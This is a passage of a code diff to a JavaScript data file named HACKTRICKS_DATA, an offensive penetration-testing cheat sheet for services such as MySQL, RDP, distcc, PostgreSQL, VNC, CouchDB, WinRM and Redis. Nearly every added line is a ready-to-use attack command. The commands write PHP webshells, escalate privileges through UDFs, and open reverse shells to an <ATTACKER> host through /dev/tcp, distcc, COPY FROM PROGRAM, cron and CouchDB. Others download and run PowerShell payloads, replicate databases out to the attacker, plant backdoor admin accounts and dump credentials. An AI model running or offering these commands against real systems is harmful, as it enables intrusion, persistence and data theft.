         "# Read files via LOAD DATA INFILE\nmysql -h <IP> -u root -e \"LOAD DATA INFILE '/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\\n';\"",
         "# Write webshell via INTO OUTFILE\nmysql -h <IP> -u root -e \"SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"",
         "# UDF escalation\nmysql -h <IP> -u root -e \"SELECT sys_exec('id');\"",
-        "msf> use exploit/windows/mysql/mysql_start_up"
+        "msf> use exploit/windows/mysql/mysql_start_up",
+        "# MySQL UDF (User Defined Function) privilege escalation\n# Upload lib_mysqludf_sys.so to plugin_dir, then:\nmysql -h <IP> -u root -p\nSELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';\nCREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';\nSELECT sys_exec('id > /tmp/id.txt');",
+        "# MySQL INTO OUTFILE webshell\nmysql -h <IP> -u root -p\nSELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
+        "# MySQL password hash extraction and offline crack\nmysql -h <IP> -u root -p -e 'SELECT user,authentication_string FROM mysql.user;'\nhashcat -m 300 mysql_hashes.txt rockyou.txt  # MySQL4.1+\nhashcat -m 3200 bcrypt_hashes.txt rockyou.txt  # MySQL 8 caching_sha2"
       ],
       "post_exploitation": [
         "mysql -h <IP> -u root -e 'SELECT user,password FROM mysql.user;'",
         "cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v '#'",
-        "cat /var/lib/mysql/mysql/user.MYD | strings | grep -i pass"
+        "cat /var/lib/mysql/mysql/user.MYD | strings | grep -i pass",
+        "# Dump all databases for data exfiltration\nmysqldump -h <IP> -u root -p --all-databases > all_dbs.sql",
+        "# Read arbitrary OS files via LOAD DATA INFILE\nmysql -h <IP> -u root -p\nLOAD DATA INFILE '/etc/passwd' INTO TABLE test.passwd FIELDS TERMINATED BY ':' LINES TERMINATED BY '\\n';",
+        "# Search all databases for password columns\nmysql -h <IP> -u root -p -e \"SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%' OR column_name LIKE '%secret%';\""
       ],
       "other": [
         "# Connect remotely\nmysql -h <IP> -P 3306 -u <user> -p'<pass>' <database>",
-        "msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS <IP>; run; exit'"
+        "msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS <IP>; run; exit'",
+        "# Check if MySQL runs as root (critical misconfiguration)\nmysql -h <IP> -u root -p -e 'SELECT user();'\n# Also check: SHOW VARIABLES LIKE 'secure_file_priv';  -- empty = no restriction on file ops",
+        "# MySQL event scheduler for persistence\nmysql -h <IP> -u root -p\nCREATE EVENT backdoor ON SCHEDULE EVERY 1 MINUTE DO SELECT sys_exec('bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1');"
       ]
     }
   },
@@ -6054,7 +6343,9 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "nmap --script 'rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info' -p 3389 -T4 <IP>",
         "nxc rdp <IP> -u <user> -p <pass>",
-        "nxc rdp <IP> --nla-screenshot"
+        "nxc rdp <IP> --nla-screenshot",
+        "# RDP version and NLA detection\nnmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 <IP>",
+        "# Check CredSSP/NLA requirements\nrdp-sec-check.pl <IP>"
       ],
       "exploitation": [
         "hydra -L users.txt -P rockyou.txt -t 4 rdp://<IP>",
@@ -6067,15 +6358,26 @@ var HACKTRICKS_DATA = {
         "# NLA downgrade check\nnmap -p 3389 --script rdp-enum-encryption <IP>  # check if NLA required",
         "# Clipboard data extraction via RDP session\n# In active RDP session: xdotool type; xclip -o",
         "# BlueKeep CVE-2019-0708\nmsf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS <IP>\nset target 5  # Win7 SP1 x64",
-        "# DejaBlue CVE-2019-1182/1181\nmsf> use exploit/windows/rdp/cve_2019_1182_dejalue"
+        "# DejaBlue CVE-2019-1182/1181\nmsf> use exploit/windows/rdp/cve_2019_1182_dejalue",
+        "# BlueKeep (CVE-2019-0708) – pre-auth RCE on RDP\nmsf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS <IP>; set TARGET 2; run",
+        "# DejaBlue (CVE-2019-1181/1182) – pre-auth RCE\nmsf> use exploit/windows/rdp/cve_2019_1181_bluekeep\nset RHOSTS <IP>; run",
+        "# Pass-the-Hash via RDP (Restricted Admin mode)\nxfreerdp /v:<IP> /u:<USER> /pth:<NTHASH> /d:<DOMAIN> /cert-ignore +auto-reconnect",
+        "# RDP brute force with crowbar\ncrowbar -b rdp -s <IP>/32 -U users.txt -C passwords.txt -n 1",
+        "# RDP session hijacking (requires SYSTEM on target)\n# List sessions: query session\n# Hijack: tscon <SESSION_ID> /dest:<CURRENT_SESSION>\ntscon 2 /dest:console  # hijack session 2 to your console",
+        "# Clipboard and drive redirection for data exfil\nxfreerdp /v:<IP> /u:<USER> /p:<PASS> /drive:share,/tmp /clipboard"
       ],
       "post_exploitation": [
         "# Session hijacking\nquery user\ntscon <SESSION_ID> /dest:<SESSION_NAME>",
         "# Shadow session\nmstsc /v:<IP> /shadow:<SESSION_ID> /control",
-        "net localgroup 'Remote Desktop Users' <user> /add"
+        "net localgroup 'Remote Desktop Users' <user> /add",
+        "# Enable RDP remotely via registry\nreg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall add rule name=RDP protocol=TCP dir=in localport=3389 action=allow",
+        "# Dump RDP connection history for pivot targets\nreg query 'HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers'",
+        "# Shadow session monitoring (view other users' RDP sessions)\nmstsc /shadow:<SESSION_ID> /v:<IP> /noconsentprompt"
       ],
       "other": [
-        "# RDP protocol check\nrdp_check domain/user:pass@<IP>"
+        "# RDP protocol check\nrdp_check domain/user:pass@<IP>",
+        "# NLA bypass via leaked credentials\n# If NLA enabled, credentials required before RDP session established\n# Use stolen credentials or PTH if Restricted Admin enabled",
+        "# RDP over SSH tunnel (bypass firewall)\nssh -L 3389:127.0.0.1:3389 user@<SSH_RELAY>\nxfreerdp /v:127.0.0.1 /u:<USER> /p:<PASS>"
       ]
     }
   },
@@ -6085,20 +6387,28 @@ var HACKTRICKS_DATA = {
     "categories": {
       "enumeration": [
         "nmap -p 3632 -sV <IP>",
-        "nmap -p 3632 --script distcc-cve2004-2687 <IP>"
+        "nmap -p 3632 --script distcc-cve2004-2687 <IP>",
+        "# Detect distccd version\nnmap -p 3632 -sV <IP>",
+        "# Check if distcc accepts arbitrary compilation requests\ndistcc --version 2>/dev/null; echo 'DISTCC_HOSTS=<IP>:3632' && distcc cc -c /dev/null -o /dev/null"
       ],
       "exploitation": [
         "nmap -p 3632 --script distcc-cve2004-2687 --script-args 'distcc-exec.cmd=id' <IP>",
         "msf> use exploit/unix/misc/distcc_exec",
-        "# Reverse shell via distcc\nnmap -p 3632 --script distcc-cve2004-2687 --script-args 'distcc-exec.cmd=nc <ATTACKER> 4444 -e /bin/bash' <IP>"
+        "# Reverse shell via distcc\nnmap -p 3632 --script distcc-cve2004-2687 --script-args 'distcc-exec.cmd=nc <ATTACKER> 4444 -e /bin/bash' <IP>",
+        "# distccd RCE – execute commands via compiler wrapper\nnmap -p 3632 --script distcc-cve2004-2687 --script-args='distcc-cve2004-2687.cmd=id' <IP>",
+        "# Metasploit distccd exploit (CVE-2004-2687)\nmsf> use exploit/unix/misc/distcc_exec\nset RHOST <IP>; set PAYLOAD cmd/unix/reverse_bash; set LHOST <ATTACKER>; run",
+        "# Manual exploit via raw socket\nDISTCC_HOSTS='<IP>:3632' distcc sh -c 'id > /tmp/distcc_rce.txt'"
       ],
       "post_exploitation": [
         "# distcc runs as daemon user - check what's accessible\nid; whoami; hostname",
         "# Look for SUID binaries and writable paths\nfind / -perm -4000 -type f 2>/dev/null",
-        "cat /etc/distcc/clients.allow 2>/dev/null"
+        "cat /etc/distcc/clients.allow 2>/dev/null",
+        "# distccd runs as 'daemon' user – pivot to higher privileges\n# Check sudo rights:\necho 'id; sudo -l' | DISTCC_HOSTS='<IP>:3632' distcc sh -c 'sh'",
+        "# Establish reverse shell via distccd\nnmap -p 3632 --script distcc-cve2004-2687 --script-args=\"distcc-cve2004-2687.cmd=bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\" <IP>"
       ],
       "other": [
-        "# distcc CVE-2004-2687 - remote code execution via compile jobs"
+        "# distcc CVE-2004-2687 - remote code execution via compile jobs",
+        "# distccd config – check allowed client IPs\ncat /etc/distcc/clients.allow 2>/dev/null\n# If '0.0.0.0/0' or empty → any host can use distcc"
       ]
     }
   },
@@ -6111,20 +6421,29 @@ var HACKTRICKS_DATA = {
         "svn ls svn://<IP>/",
         "svn info svn://<IP>/repo",
         "svn log svn://<IP>/repo",
-        "svn checkout svn://<IP>/repo"
+        "svn checkout svn://<IP>/repo",
+        "# SVN anonymous checkout\nsvn ls svn://<IP>/\nsvn log svn://<IP>/repo --limit 10",
+        "# Enumerate all repos via svnserve\nsvn ls svn://<IP>"
       ],
       "exploitation": [
         "# Checkout repo and search for credentials\nsvn checkout svn://<IP>/repo /tmp/svn_dump\ngrep -r 'password\\|secret\\|key\\|token' /tmp/svn_dump",
         "# Brute force auth\nfor u in admin dev ci; do for p in $(cat passlist.txt); do svn ls --username $u --password $p svn://<IP>/repo 2>/dev/null && echo \"[+] $u:$p\"; done; done",
-        "# CVE-2021-28544 / path traversal\nprintf 'pwn' > /tmp/payload\nsvnmucc -m 'test' put /tmp/payload 'http://<IP>/svn/repo/trunk/bad%01path.txt'"
+        "# CVE-2021-28544 / path traversal\nprintf 'pwn' > /tmp/payload\nsvnmucc -m 'test' put /tmp/payload 'http://<IP>/svn/repo/trunk/bad%01path.txt'",
+        "# Checkout full SVN history including deleted files\nsvn checkout svn://<IP>/repo /tmp/svn_checkout\nsvn log svn://<IP>/repo -v --limit 100 > /tmp/svn_log.txt\n# Search history for credentials:\nsvn log svn://<IP>/repo --diff | grep -iE 'password|secret|key|token'",
+        "# SVN history mining for removed secrets\nsvn cat -r <REV> svn://<IP>/repo/config.php  # retrieve old revision of sensitive file",
+        "# Brute force SVN auth\nnmap -p 3690 --script svn-brute --script-args svn.repo=/repo,brute.firstonly=true <IP>"
       ],
       "post_exploitation": [
         "# After SVN checkout, mine history for credentials\nsvn log svn://<IP>/repo -v | grep -iE 'password|key|token|secret'",
         "# Check all revisions for deleted sensitive files\nsvn diff -r 1:HEAD svn://<IP>/repo | grep -iE '\\+.*password\\|\\+.*secret'",
-        "find /tmp/svn_dump -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null | xargs grep -i 'password' 2>/dev/null"
+        "find /tmp/svn_dump -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null | xargs grep -i 'password' 2>/dev/null",
+        "# After SVN access: search commit messages for credential hints\nsvn log svn://<IP>/repo -v --limit 1000 | grep -iE 'password|fix cred|token|secret'",
+        "# Dump all file contents across all revisions\nsvnadmin dump /var/lib/svn/repo > /tmp/repo.dump\nstrings /tmp/repo.dump | grep -iE 'password|secret|api.key'"
       ],
       "other": [
-        "svn diff -r 1:HEAD svn://<IP>/repo  # view all historical changes"
+        "svn diff -r 1:HEAD svn://<IP>/repo  # view all historical changes",
+        "# SVN over HTTPS\nsvn ls https://<IP>/svn/repo --trust-server-cert --non-interactive",
+        "# Check svnserve.conf for anonymous access\ncat /etc/subversion/svnserve.conf\n# Or in repo:\ncat /var/lib/svn/repo/conf/svnserve.conf"
       ]
     }
   },
@@ -6309,7 +6628,9 @@ var HACKTRICKS_DATA = {
         "psql -h <IP> -U postgres",
         "psql -h <IP> -U postgres -l",
         "msf> use auxiliary/scanner/postgres/postgres_version",
-        "msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection"
+        "msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection",
+        "# Connect and enumerate\npsql -h <IP> -U postgres -c '\\l'  # list databases\npsql -h <IP> -U postgres -c 'SELECT version();'\npsql -h <IP> -U postgres -c 'SELECT usename, passwd FROM pg_shadow;'",
+        "# Nmap PostgreSQL scripts\nnmap -p 5432 --script pgsql-brute --script-args brute.firstonly=true <IP>"
       ],
       "exploitation": [
         "# COPY to execute OS commands (superuser)\npsql -h <IP> -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id > /tmp/out';\"",
@@ -6321,15 +6642,24 @@ var HACKTRICKS_DATA = {
         "# pg_hba.conf trust misconfiguration\n# If trust auth enabled, no password needed\npsql -h <IP> -U postgres  # just connect, no pass prompt",
         "# pgAgent job for persistence\npsql -h <IP> -U postgres -c \"\nINSERT INTO pgagent.pga_job(jobjclid, jobname, jobdesc, jobhostagent, jobenabled) VALUES (1, 'evil', '', '', true);\nINSERT INTO pgagent.pga_step(jstjobid, jstname, jstkind, jstcode) VALUES (lastval(), 'step1', 's', 'COPY (SELECT '') TO PROGRAM ''bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1''');\"",
         "# Event trigger persistence backdoor\npsql -h <IP> -U postgres -c \"CREATE OR REPLACE FUNCTION bd() RETURNS event_trigger AS \\$\\$ BEGIN PERFORM pg_sleep(0); COPY (SELECT '') TO PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\\\"'; END; \\$\\$ LANGUAGE plpgsql; CREATE EVENT TRIGGER bd ON ddl_command_start EXECUTE FUNCTION bd();\"",
-        "# lo_* file read\npsql -h <IP> -U postgres -c \"SELECT lo_import('/etc/passwd'); SELECT encode(lo_get(lastval()), 'escape');\""
+        "# lo_* file read\npsql -h <IP> -U postgres -c \"SELECT lo_import('/etc/passwd'); SELECT encode(lo_get(lastval()), 'escape');\"",
+        "# PostgreSQL COPY TO/FROM for file read/write\npsql -h <IP> -U postgres\nCOPY (SELECT '') TO '/var/lib/postgresql/.ssh/authorized_keys';  # SSH key\nCOPY cmd_exec FROM PROGRAM 'id';  # RCE via COPY FROM PROGRAM (pg 9.3+)",
+        "# PostgreSQL RCE via COPY FROM PROGRAM\npsql -h <IP> -U postgres -c \"COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1';\"",
+        "# pg_largeobject file read (pre-9.3)\npsql -h <IP> -U postgres\nSELECT lo_import('/etc/passwd');\nSELECT lo_get(<OID>);",
+        "# PostgreSQL extension loading for UDF execution\nCREATE EXTENSION IF NOT EXISTS dblink;\nSELECT dblink_exec('host=127.0.0.1 user=postgres', $$COPY cmd FROM PROGRAM 'id'$$);"
       ],
       "post_exploitation": [
         "psql -h <IP> -U postgres -c 'SELECT usename,passwd FROM pg_shadow;'",
         "find /etc/postgresql -name '*.conf' 2>/dev/null",
-        "cat ~/.pgpass 2>/dev/null"
+        "cat ~/.pgpass 2>/dev/null",
+        "# Dump all password hashes\npsql -h <IP> -U postgres -c 'SELECT usename, passwd FROM pg_shadow;'\nhashcat -m 28400 pg_hashes.txt rockyou.txt  # SCRAM-SHA-256\nhashcat -m 11600 pg_hashes.txt rockyou.txt  # md5",
+        "# Search all databases for sensitive columns\npsql -h <IP> -U postgres -c \"SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name ILIKE '%password%' OR column_name ILIKE '%secret%' OR column_name ILIKE '%token%';\"",
+        "# PostgreSQL pg_hba.conf – check for trust auth (no password)\ncat /etc/postgresql/*/main/pg_hba.conf | grep trust"
       ],
       "other": [
-        "# PostgreSQL useful commands:\n# \\l - list DBs, \\c <db> - connect, \\dt - list tables, \\du - list users"
+        "# PostgreSQL useful commands:\n# \\l - list DBs, \\c <db> - connect, \\dt - list tables, \\du - list users",
+        "# PostgreSQL pgcrypto for decrypting encrypted columns\nSELECT pgp_sym_decrypt(encrypted_col::bytea, 'secret_key') FROM target_table;",
+        "# Check for ssl_cert_file – steal server cert\nSHOW data_directory;\n-- Then: ls /var/lib/postgresql/*/main/server.crt"
       ]
     }
   },
@@ -6444,23 +6774,34 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "nmap -sV --script vnc-info,vnc-title,realvnc-auth-bypass -p 5900 <IP>",
         "msf> use auxiliary/scanner/vnc/vnc_none_auth",
-        "nmap -p 5900 --script vnc-brute <IP>"
+        "nmap -p 5900 --script vnc-brute <IP>",
+        "# VNC version fingerprint\nnmap -p 5900 -sV --script vnc-info,vnc-brute <IP>",
+        "# Check VNC auth type (1=None, 2=VNC Auth, 16=TightVNC, 18=TLSNone)\nnc <IP> 5900 | strings | head -5  # RFB version banner"
       ],
       "exploitation": [
         "# No-auth bypass\nvncviewer <IP>::5900",
         "hydra -P passwords.txt vnc://<IP>",
         "msf> use auxiliary/scanner/vnc/vnc_login",
         "# Decrypt saved VNC password\nvncpwd <vnc_passwd_file>",
-        "cat ~/.vnc/passwd | xxd"
+        "cat ~/.vnc/passwd | xxd",
+        "# VNC auth bypass: LibVNCServer NULL auth (CVE-2018-7225)\n# Type 1 (None) – connect without password\nvncviewer <IP>:5900  # if no auth configured",
+        "# VNC brute force\nhydra -P rockyou.txt -t 4 vnc://<IP>\nmsf> use auxiliary/scanner/vnc/vnc_login",
+        "# VNC screenshot capture without full session\nvncsnapshot -passwd pass.txt <IP> 5900 /tmp/screenshot.jpg",
+        "# CVE-2022-41975 – RealVNC authentication bypass\n# Affects RealVNC 6.7.0 and below\nmsf> use auxiliary/scanner/vnc/vnc_login  # with empty password"
       ],
       "post_exploitation": [
         "# After VNC access, screenshot the desktop\nvncviewer -screenshot <IP>::5900",
         "find ~/.vnc /etc/vnc -name 'passwd' 2>/dev/null",
         "# Decrypt VNC password file\ncat ~/.vnc/passwd | xxd -p | tr -d '\\n' | fold -w2 | awk '{printf \"\\\\x\"$1}' | openssl enc -des-cbc -K e84ad660c4721ae0 -iv 0000000000000000 -d -nopad 2>/dev/null",
-        "ps aux | grep -iE 'vnc|x11vnc|tigervnc'"
+        "ps aux | grep -iE 'vnc|x11vnc|tigervnc'",
+        "# VNC session recording for credential harvesting\nvncdo -s <IP>:5900 -p <PASS> key ctrl-a  # trigger clipboard\nvncdo -s <IP>:5900 -p <PASS> capture /tmp/vnc_capture.png",
+        "# Keylogging via VNC – monitor all keystrokes\nwireshark -i eth0 -k -f 'tcp port 5900'  # capture VNC traffic\n# VNC traffic can be decrypted if password known",
+        "# Plant backdoor via VNC GUI access\n# Use VNC access to launch cmd.exe and add admin user:\nvncdo -s <IP>:5900 -p <PASS> key ctrl-r type 'cmd' key Return\nvncdo type 'net user backdoor P@ss123 /add && net localgroup administrators backdoor /add' key Return"
       ],
       "other": [
-        "# VNC password hash format (DES, 8-char max)\necho -n '<8char_pass>' | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 | xxd"
+        "# VNC password hash format (DES, 8-char max)\necho -n '<8char_pass>' | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 | xxd",
+        "# VNC over SSH tunnel\nssh -L 5901:127.0.0.1:5900 user@<IP>\nvncviewer 127.0.0.1:5901",
+        "# VNC password file location\ncat ~/.vnc/passwd | xxd  # VNC password is stored as DES-encrypted 8-char key\n# Decrypt with vncpwd:\nvncpwd ~/.vnc/passwd"
       ]
     }
   },
@@ -6472,22 +6813,30 @@ var HACKTRICKS_DATA = {
         "curl http://<IP>:5984/",
         "curl -X GET http://<IP>:5984/_all_dbs",
         "nmap -sV --script couchdb-databases,couchdb-stats -p 5984 <IP>",
-        "curl http://<IP>:5984/_utils  # Fauxton UI"
+        "curl http://<IP>:5984/_utils  # Fauxton UI",
+        "# CouchDB version and admin party check\ncurl http://<IP>:5984/\ncurl http://<IP>:5984/_all_dbs",
+        "# Check admin party (no admin configured)\ncurl http://<IP>:5984/_config/admins/"
       ],
       "exploitation": [
         "# Create admin user (if no admin exists - 'Admin Party')\ncurl -X PUT http://<IP>:5984/_config/admins/hacker -d '\"password\"'",
         "# RCE via os_daemons\ncurl -X PUT 'http://admin:pass@<IP>:5984/_node/couchdb@localhost/_config/os_daemons/pwn' -d '\"/bin/bash -c \\\"bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\\\"\"'",
         "# Query server RCE\ncurl -X PUT 'http://admin:pass@<IP>:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '\"/bin/id > /tmp/out\"'",
-        "msf> use auxiliary/scanner/couchdb/couchdb_enum"
+        "msf> use auxiliary/scanner/couchdb/couchdb_enum",
+        "# CouchDB admin party – no auth required, add admin\ncurl -X PUT http://<IP>:5984/_config/admins/attacker -d '\"P@ssw0rd\"'",
+        "# CouchDB RCE via server-side request forgery (CVE-2017-12636)\ncurl -X PUT http://admin:pass@<IP>:5984/_node/couchdb@127.0.0.1/_config/query_servers/cmd -d '\"bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\"'\ncurl -X POST http://admin:pass@<IP>:5984/test/_design/rce -d '{\"_id\":\"_design/rce\",\"views\":{\"run\":{\"map\":\"function(doc){emit(null,null)}\"}},\"language\":\"cmd\"}'",
+        "# Dump all documents from all databases\nfor db in $(curl -s http://<IP>:5984/_all_dbs | tr -d '[]\"' | tr ',' '\\n'); do\n  curl -s http://<IP>:5984/$db/_all_docs?include_docs=true > /tmp/couchdb_$db.json\ndone"
       ],
       "post_exploitation": [
         "curl -X PUT -d '{\"type\":\"user\",\"name\":\"hacker\",\"roles\":[\"_admin\"],\"password\":\"hacker\"}' http://<IP>:5984/_users/org.couchdb.user:hacker -H 'Content-Type:application/json'",
         "# After CouchDB access, dump all databases\ncurl -X GET http://admin:pass@<IP>:5984/_all_dbs | jq -r '.[]' | while read db; do curl -s http://admin:pass@<IP>:5984/$db/_all_docs?include_docs=true; done",
         "cat /etc/couchdb/local.ini 2>/dev/null | grep -iE 'password|admin'",
-        "find /var/lib/couchdb -name '*.couch' 2>/dev/null"
+        "find /var/lib/couchdb -name '*.couch' 2>/dev/null",
+        "# Extract user credentials from _users database\ncurl http://admin:pass@<IP>:5984/_users/_all_docs?include_docs=true | python3 -m json.tool | grep -E 'name|password_sha'",
+        "# CouchDB Fauxton admin panel at /_utils\ncurl http://admin:pass@<IP>:5984/_utils/  # redirect to Fauxton"
       ],
       "other": [
-        "# CouchDB default port 5984, admin UI at /_utils"
+        "# CouchDB default port 5984, admin UI at /_utils",
+        "# CouchDB replication – pull all data from remote (persistence/exfil)\ncurl -X POST http://admin:pass@<IP>:5984/_replicate -H 'Content-Type: application/json' \\\n  -d '{\"source\":\"http://<IP>:5984/sensitive_db\",\"target\":\"http://<ATTACKER>:5984/exfil\",\"continuous\":true}'"
       ]
     }
   },
@@ -6499,24 +6848,35 @@ var HACKTRICKS_DATA = {
         "nmap -p 5985 --script http-auth-finder <IP>",
         "Test-WSMan <IP>",
         "curl http://<IP>:5985/wsman",
-        "nxc winrm <IP> -u user -p pass"
+        "nxc winrm <IP> -u user -p pass",
+        "# WinRM availability check\ncurl -s http://<IP>:5985/wsman -o /dev/null -w '%{http_code}'  # 200/401 = WinRM active",
+        "# Nmap WinRM detection\nnmap -p 5985,5986 -sV --script http-auth-finder <IP>"
       ],
       "exploitation": [
         "evil-winrm -u Administrator -p 'Password123!' -i <IP>",
         "evil-winrm -u <user> -H <NTLM_HASH> -i <IP>",
         "nxc winrm <IP> -u <user> -p <pass> -x 'whoami'",
         "Invoke-Command -ComputerName <IP> -ScriptBlock { whoami } -Credential (Get-Credential)",
-        "# NTLM relay to WinRM\nntlmrelayx.py -t wsman://<IP> --no-smb-server -smb2support --command 'net user pwned P@ss /add'"
+        "# NTLM relay to WinRM\nntlmrelayx.py -t wsman://<IP> --no-smb-server -smb2support --command 'net user pwned P@ss /add'",
+        "# Evil-WinRM – full interactive shell\nevil-winrm -i <IP> -u <USER> -p <PASS>\nevil-winrm -i <IP> -u <USER> -H <NTHASH>  # pass-the-hash",
+        "# PowerShell remoting session\n$s = New-PSSession -ComputerName <IP> -Credential (Get-Credential)\nInvoke-Command -Session $s -ScriptBlock { whoami; ipconfig }",
+        "# WinRM over HTTPS (5986) – bypass cert validation\nevil-winrm -i <IP> -u <USER> -p <PASS> -S -c /tmp/cert.pem -k /tmp/key.pem",
+        "# WinRM file upload/download\nevil-winrm -i <IP> -u <USER> -p <PASS>\n# In evil-winrm shell:\nupload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe\ndownload C:\\Users\\Administrator\\Desktop\\flag.txt /tmp/flag.txt"
       ],
       "post_exploitation": [
         "# After WinRM access, dump credentials\nInvoke-Command -ComputerName <IP> -ScriptBlock { mimikatz.exe 'sekurlsa::logonpasswords' 'exit' }",
         "# Load PowerShell scripts remotely\nInvoke-Command -ComputerName <IP> -FilePath C:\\path\\to\\PowerView.ps1",
         "# Establish persistent PS session\n$s = New-PSSession -ComputerName <IP> -Credential (Get-Credential)\nEnter-PSSession $s",
-        "evil-winrm -u <user> -p <pass> -i <IP> -s /opt/privesc_scripts/"
+        "evil-winrm -u <user> -p <pass> -i <IP> -s /opt/privesc_scripts/",
+        "# Enable WinRM remotely (if local admin via SMB/WMI)\nInvoke-WmiMethod -ComputerName <IP> -Class Win32_Process -Name Create -ArgumentList 'winrm quickconfig -quiet'\n# Or via PsExec:\npsexec.py <DOMAIN>/<USER>:<PASS>@<IP> 'winrm quickconfig -quiet'",
+        "# WinRM persistence via scheduled task\nInvoke-Command -ComputerName <IP> -ScriptBlock {\n  Register-ScheduledTask -TaskName 'Updater' -Trigger (New-ScheduledTaskTrigger -AtLogon) \\\n  -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w h -c IEX(New-Object Net.WebClient).DownloadString(\"http://<ATTACKER>/payload.ps1\")')\n}",
+        "# Dump credentials via WinRM session\nInvoke-Command -ComputerName <IP> -ScriptBlock {\n  IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/Invoke-Mimikatz.ps1')\n  Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'\n}"
       ],
       "other": [
         "Enable-PSRemoting -Force\nSet-Item wsman:\\localhost\\client\\trustedhosts *",
-        "# WinRM over HTTPS (5986) uses self-signed cert by default"
+        "# WinRM over HTTPS (5986) uses self-signed cert by default",
+        "# Check WinRM authentication methods\ncurl -s -I http://<IP>:5985/wsman | grep -i 'WWW-Authenticate'",
+        "# WinRM Kerberos auth (domain environment)\nevil-winrm -i <IP> -u <USER>@<DOMAIN> -p <PASS> -r <DOMAIN>"
       ]
     }
   },
@@ -6561,7 +6921,9 @@ var HACKTRICKS_DATA = {
         "redis-cli -h <IP> INFO",
         "redis-cli -h <IP> CONFIG GET *",
         "redis-cli -h <IP> CLIENT LIST",
-        "redis-cli -h <IP> KEYS '*'"
+        "redis-cli -h <IP> KEYS '*'",
+        "# Redis unauthenticated INFO dump\nredis-cli -h <IP> INFO\nredis-cli -h <IP> CONFIG GET *\nredis-cli -h <IP> DBSIZE",
+        "# Nmap Redis scripts\nnmap -p 6379 --script redis-info <IP>"
       ],
       "exploitation": [
         "# Write SSH authorized_keys\nredis-cli -h <IP> config set dir /root/.ssh/\nredis-cli -h <IP> config set dbfilename authorized_keys\nredis-cli -h <IP> set x '\\n\\nssh-rsa AAAA... attacker\\n\\n'\nredis-cli -h <IP> save",
@@ -6572,16 +6934,25 @@ var HACKTRICKS_DATA = {
         "# CONFIG REWRITE for persistent config backdoor\nredis-cli -h <IP> CONFIG SET bind '0.0.0.0'\nredis-cli -h <IP> CONFIG REWRITE",
         "# Redis Sentinel abuse\nredis-cli -h <IP> -p 26379 SENTINEL masters\nredis-cli -h <IP> -p 26379 SENTINEL failover <master_name>",
         "# Lua sandbox escape (Redis < 7.0)\nredis-cli -h <IP> EVAL \"return redis.call('debug','reload')\" 0",
-        "# Master-slave replication for data exfil\nredis-cli -h <TARGET> SLAVEOF <ATTACKER_IP> 6379"
+        "# Master-slave replication for data exfil\nredis-cli -h <TARGET> SLAVEOF <ATTACKER_IP> 6379",
+        "# Redis RCE via SSH authorized_keys write (root running Redis)\nredis-cli -h <IP>\nCONFIG SET dir /root/.ssh\nCONFIG SET dbfilename authorized_keys\nSET ssh_key '\\n\\nssh-rsa AAAA...YOUR_PUBKEY... attacker\\n\\n'\nSAVE\n# SSH in: ssh root@<IP>",
+        "# Redis RCE via cron job write\nredis-cli -h <IP>\nCONFIG SET dir /var/spool/cron/crontabs\nCONFIG SET dbfilename root\nSET cron '\\n\\n* * * * * bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\\n\\n'\nSAVE",
+        "# Redis RCE via webroot webshell write\nredis-cli -h <IP>\nCONFIG SET dir /var/www/html\nCONFIG SET dbfilename shell.php\nSET webshell '<?php system($_GET[\"cmd\"]); ?>'\nSAVE",
+        "# Redis module loading RCE (Redis 4.x/5.x)\nredis-cli -h <IP> MODULE LOAD /tmp/redis_module.so\n# Upload RedisModpwn or exploit/unix/redis/redis_replication_code_exec"
       ],
       "post_exploitation": [
         "# After Redis access, dump all key-value pairs\nredis-cli -h <IP> --scan | while read k; do echo \"$k: $(redis-cli -h <IP> GET $k)\"; done",
         "# Check for stored sessions (PHP/Laravel)\nredis-cli -h <IP> KEYS 'laravel_session:*' | head -5 | xargs -I{} redis-cli -h <IP> GET {}",
         "# Redis persistence config\nredis-cli -h <IP> CONFIG GET save\nredis-cli -h <IP> CONFIG GET appendonly",
-        "cat /etc/redis/redis.conf 2>/dev/null | grep -iE 'requirepass|bind|rename-command'"
